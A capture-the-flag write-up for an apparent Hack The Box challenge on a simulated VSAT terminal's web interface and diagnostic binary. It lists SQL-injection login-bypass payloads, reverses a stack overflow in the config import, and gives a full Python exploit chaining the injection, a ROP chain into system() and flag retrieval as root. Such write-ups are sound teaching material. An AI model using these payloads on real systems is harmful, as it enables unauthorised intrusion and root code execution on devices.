# RogueUplink — CTF Writeup

**Challenge:** RogueUplink  
**Category:** Binary Exploitation / Web  
**Flag:** `HTB{r0gu3_uplink_rce_vsat_0wn3d}`  

---

## Challenge Overview

A compromised Kestrel Dawn VSAT terminal exposes the KD-7000 web management interface. The appliance uses a legacy Lua/nginx control plane with weak session handling and an injectable SQLite-backed login form. After gaining access, the terminal's file manager allows downloading the `kd7000_diag` maintenance utility. Reversing that binary reveals a custom binary configuration format and a **stack overflow in the profile-name import path**. By crafting a valid KD70 config blob with an oversized name field, execution can be redirected into `system@plt` to achieve RCE as root.

---

## Attack Chain Summary

```
SQL Injection (login bypass)
  → Authenticated session (NMS dashboard)
    → Download kd7000_diag binary (file manager)
      → Reverse engineer: find stack overflow in memcpy()
        → Craft KD70 config with ROP chain (pop rdi; ret → system@plt)
          → Upload via diag.lua config import
            → RCE as root → cat /etc/kd7000.conf
```

---

## Phase 1: Web Reconnaissance & SQL Injection

### Target

```
http://154.57.164.78:30096/
```

The root path redirects to `/cgi-bin/login.lua` — a retro Windows 95-style KD-7000 login page (nginx/1.18.0, Lua backend on port 5000).

### SQL Injection

The login form POSTs `username` and `password` to `/cgi-bin/login.lua`. SQLite-backed authentication is trivially bypassed:

```bash
curl -X POST http://154.57.164.78:30096/cgi-bin/login.lua \
  -d "username=' OR '1'='1' --&password=x"
```

**Working payloads:**
| Payload | Result |
|---------|--------|
| `' OR '1'='1' --` | ✅ Redirect to `/cgi-bin/nms.lua` |
| `' OR 1=1--` | ✅ Redirect to `/cgi-bin/nms.lua` |
| `' UNION SELECT 1,2,3--` | ✅ Redirect to `/cgi-bin/nms.lua` |
| `'/**/OR/**/1=1--` | ✅ Redirect to `/cgi-bin/nms.lua` |

Response includes `Set-Cookie: sess=<md5>; Path=/; HttpOnly`.

The UNION SELECT with 3 columns succeeding confirms the query has 3 columns. The error code registry confirms:
- `e=1`: ERR_INVALID_CREDENTIALS
- `e=2`: ERR_BACKEND_QUERY

### Dashboard

After authentication, the NMS dashboard shows modem status, Rx/Tx parameters, and navigation to:
- **Dashboard** (`/cgi-bin/nms.lua`)
- **Diagnostics** (`/cgi-bin/diag.lua`)
- **File Manager** (`/cgi-bin/download.lua`)

---

## Phase 2: Binary Acquisition

The File Manager lists four utilities in `/usr/local/bin/`:

| Binary | Size | Description |
|--------|------|-------------|
| `kd7000_status` | 14,360 B | Terminal status reporter |
| `kd7000_modem` | 14,464 B | Modem parameter query |
| `kd7000_log` | 14,504 B | System event log viewer |
| `kd7000_diag` | 12,128 B | **Diagnostic and configuration utility** |

Download via:
```bash
curl -b "sess=<cookie>" \
  "http://154.57.164.78:30096/cgi-bin/download.lua?file=/usr/local/bin/kd7000_diag" \
  -o kd7000_diag
```

Path traversal (`../../../etc/passwd`) is blocked with "Forbidden".

---

## Phase 3: Reverse Engineering kd7000_diag

### Binary Properties

```
ELF 64-bit LSB executable, x86-64
stripped, dynamically linked
No canary, No PIE, Partial RELRO

PLT: puts, system, printf, close, read, memcmp, strcmp, fprintf, memcpy, open, perror, fwrite
```

### Config Format (KD70)

From the disassembly at `0x4012df` (config parser), the KD70 config blob has a fixed header:

| Offset | Size | Field |
|--------|------|-------|
| 0x00 | 4 | Magic: `KD70` |
| 0x04 | 1 | Version (must be `0x01`) |
| 0x05 | 1 | Section ID (1=RF_TX, 2=RF_RX, 3=MODCOD, 4=NETWORK, 5=TIMING, 6=SYSTEM) |
| 0x06 | 2 | Reserved |
| 0x08 | 4 | freq (uint32 LE) |
| 0x0C | 2 | ksps (uint16 LE) |
| 0x0E | 1 | modcod (uint8) |
| 0x0F | 2 | power_raw (uint16 LE, printed as power/10.0) |
| 0x11 | 8 | Checksum data (included in XOR) |
| 0x19 | 1 | **Checksum byte** = XOR of bytes 0x00–0x18 |
| 0x1A | 1 | **Name length** (uint8, max 255) |
| 0x1B+ | N | **Name data** |

### The Vulnerability

At `0x40129c`, the name-displaying function:

```c
void show_name(char *name_ptr, uint8_t name_length) {
    char stack_buf[32];                    // [rbp-0x20]
    memcpy(stack_buf, name_ptr, name_length);  // NO BOUNDS CHECK!
    printf("[KD7000] Config name: %.32s\n", stack_buf);
}
```

**Stack layout:**
```
[rbp-0x20] → stack_buf[0:31]  (32 bytes)
[rbp]      → saved RBP         (8 bytes)
[rbp+0x08] → return address    (8 bytes)
```

`name_length` can be up to 255 (uint8), but `stack_buf` is only 32 bytes. Overflow past 40 bytes overwrites the return address.

### Validation Flow

1. `read(fd, buf, 0x200)` — reads up to 512 bytes into BSS at `0x4037a0`
2. `memcmp(buf, "KD70", 4)` — magic check
3. `buf[4] == 1` — version check
4. `buf[5] == section_id` — section match
5. XOR of bytes `[0x00:0x18]` must equal `buf[0x19]` — checksum
6. If `buf[0x1A] > 0` and `total_read >= buf[0x1A] + 27`:
   - Calls `show_name(buf + 0x1B, buf[0x1A])` — **VULNERABLE**

---

## Phase 4: Exploit Development

### ROP Gadgets

From `__libc_csu_init` epilogue:

```
0x40176b: pop rdi; ret        (5f c3)
0x401769: pop rsi; pop r15; ret  (5e 41 5f c3)
```

### Exploit Strategy

1. Put command string at the start of the name field (in BSS at `0x4037bb`)
2. Pad to 40 bytes to reach the return address
3. ROP chain: `pop rdi; ret` → `0x4037bb` (command addr) → `system@plt` (0x401040)

### Name Field Layout

```
[0x00:0xNN]  Command string + null terminator (e.g., "cat /etc/kd7000.conf\x00")
[0xNN:0x28]  Padding 'A's to fill 40 bytes total
[0x28:0x30]  pop rdi; ret gadget (0x40176b, little-endian)
[0x30:0x38]  Command address in BSS (0x4037bb, little-endian)
[0x38:0x40]  system@plt (0x401040, little-endian)
```

Name length = 64 (0x40).

### Delivery

The Diagnostics page has a "Configuration Section Import" form that:
1. Reads a `.bin` file as hex
2. POSTs to `/cgi-bin/diag.lua` with `param_name=<section>`, `param_value=<hex>`, `action=set_param`
3. The backend runs `kd7000_diag --section <name> <file>` — triggering the overflow

### Full Exploit Script

```python
import struct
import requests

TARGET = "154.57.164.78:30096"
SYSTEM_PLT = 0x401040
POP_RDI_RET = 0x40176b
NAME_BSS_ADDR = 0x4037bb

def build_config(section_id, command):
    header = bytearray(27)
    header[0:4] = b"KD70"
    header[4] = 1
    header[5] = section_id  # 1=RF_TX
    struct.pack_into("<I", header, 8, 11700)   # freq
    struct.pack_into("<H", header, 12, 4096)    # ksps
    header[14] = 3                              # modcod
    struct.pack_into("<H", header, 15, 439)     # power_raw
    for i in range(17, 25): header[i] = i       # checksum data
    
    checksum = 0
    for i in range(25): checksum ^= header[i]
    header[25] = checksum
    
    name = bytearray()
    name.extend(command.encode() + b"\x00")
    while len(name) < 40: name.append(0x41)
    name.extend(struct.pack("<Q", POP_RDI_RET))
    name.extend(struct.pack("<Q", NAME_BSS_ADDR))
    name.extend(struct.pack("<Q", SYSTEM_PLT))
    header[26] = len(name)
    
    return bytes(header) + bytes(name)

# SQL injection login
s = requests.Session()
r = s.post(f"http://{TARGET}/cgi-bin/login.lua",
    data={"username": "' OR '1'='1' --", "password": "x"},
    allow_redirects=False)

# Upload malicious config
config = build_config(1, "cat /etc/kd7000.conf > /tmp/flag.txt")
requests.post(f"http://{TARGET}/cgi-bin/diag.lua",
    cookies=s.cookies,
    data={"param_name": "RF_TX", "param_value": config.hex(), "action": "set_param"})

# Retrieve flag
flag = s.get(f"http://{TARGET}/cgi-bin/download.lua?file=/tmp/flag.txt")
print(flag.text)  # HTB{r0gu3_uplink_rce_vsat_0wn3d}
```

---

## Phase 5: Flag Recovery

### Enumeration

```bash
id                    # uid=0(root) gid=0(root)
ls -la /              # reveals /conf, /app, /etc/kd7000
ls -la /etc/          # reveals /etc/kd7000.conf (33 bytes, -r--------)
```

### Flag File

```
/etc/kd7000.conf → HTB{r0gu3_uplink_rce_vsat_0wn3d}
```

The `/conf/nms.db` SQLite database contains a single `users` table with user `unknown_user` / password `Kdr7!xP#2024` — not needed since we bypass auth entirely.

---

## How We Solved It — Reasoning

**Initial hypothesis:** The login form would have SQL injection since the description explicitly says "injectable SQLite-backed login form." Classic `' OR '1'='1' --` bypass worked immediately, confirming the vulnerability.

**Binary analysis approach:** Since we're on an ARM64 Kali host, we couldn't run the x86-64 binary directly. We used Capstone (capstone 5.0.9 in a venv) for full disassembly. The `checksec`-style analysis showed no stack canary and no PIE, making direct return address overwrites viable without needing an info leak.

**Finding the overflow:** Tracing the config parser (`0x4012df`) revealed the key call flow: validate magic/version/section/checksum → check name_length at `buf[0x1A]` → call `show_name(buf + 0x1B, buf[0x1A])`. The `show_name` function (`0x40129c`) allocates a 32-byte stack buffer (`sub rsp, 0x30`) and does `memcpy(stack_buf, name_ptr, name_length)` with no bounds check — the name_length comes from a single byte in the config, allowing values up to 255.

**ROP chain selection:** The `__libc_csu_init` epilogue provides `pop rdi; ret` at `0x40176b`, which is the classic one-gadget approach for calling `system()` with a controlled argument. Since the command string lives in BSS at a known address (`0x4037bb`, the name field in the config buffer), no stack pivoting or additional setup is needed.

**Alternative approaches considered:**
- **ret2libc full chain:** Unnecessary — binary is small, has `system@plt`, and we control the argument placement directly.
- **Reverse shell:** Unnecessary — we're root, can write command output to `/tmp/` and retrieve via the file manager, which is simpler and more reliable.

**Why this challenge is realistic:** VSAT terminals in the field often run vendor-provided maintenance tools with minimal security. The combination of a weak web interface (SQLite login bypass), an exposed file manager, and a vendor utility with a classic stack overflow mirrors real-world embedded satcom gear where the web stack and control plane share the same system.

---

## IoCs & Artifacts

| Artifact | Value |
|----------|-------|
| Target IP:Port | `154.57.164.78:30096` |
| Web server | nginx/1.18.0 |
| Backend | Lua CGI on port 5000 |
| Binary | `kd7000_diag` (ELF x86-64, stripped) |
| Vulnerability | Stack buffer overflow in name import |
| Privesc | Already root (web stack runs as root) |
| Flag location | `/etc/kd7000.conf` |

---

## References

- Exploit script: `rogueuplink/exploit.py`
- Disassembly analysis: `rogueuplink/analyze.py`
- Gadget scanner: `rogueuplink/gadgets.py`